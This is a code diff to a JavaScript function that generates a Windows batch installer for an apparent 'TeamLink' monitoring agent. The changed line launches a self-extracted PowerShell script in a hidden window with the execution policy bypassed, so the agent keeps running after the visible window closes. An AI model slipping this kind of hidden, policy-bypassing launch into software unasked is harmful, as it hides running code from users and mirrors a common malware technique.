@@ -644,7 +644,8 @@ function agentSetupFile(payload) {
     // the marker is built in two parts here, so the only whole one in this file is the line above the agent
     'powershell -NoProfile -ExecutionPolicy Bypass -Command "$t=[IO.File]::ReadAllText($env:TLSELF); $m=\':\'+\'::TEAMLINK-AGENT\'; $i=$t.IndexOf($m); [IO.File]::WriteAllText((Join-Path $env:TLDIR \'TeamLinkMonitor.ps1\'), $t.Substring($i+$m.Length).TrimStart())"',
     'if not "%errorlevel%"=="0" goto failed',
-    'powershell -NoProfile -ExecutionPolicy Bypass -File "%TLDIR%\\TeamLinkMonitor.ps1"',
+    // on its own, as Windows starts it: under Windows Terminal an agent left in this window cannot hide it, and closing it stopped the agent
+    'powershell -NoProfile -ExecutionPolicy Bypass -Command "Start-Process -FilePath powershell -WindowStyle Hidden -ArgumentList (\'-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File \'+[char]34+$env:TLDIR+\'\\TeamLinkMonitor.ps1\'+[char]34)"',
     'if not "%errorlevel%"=="0" goto failed',
     'exit /b 0',
     ':failed',
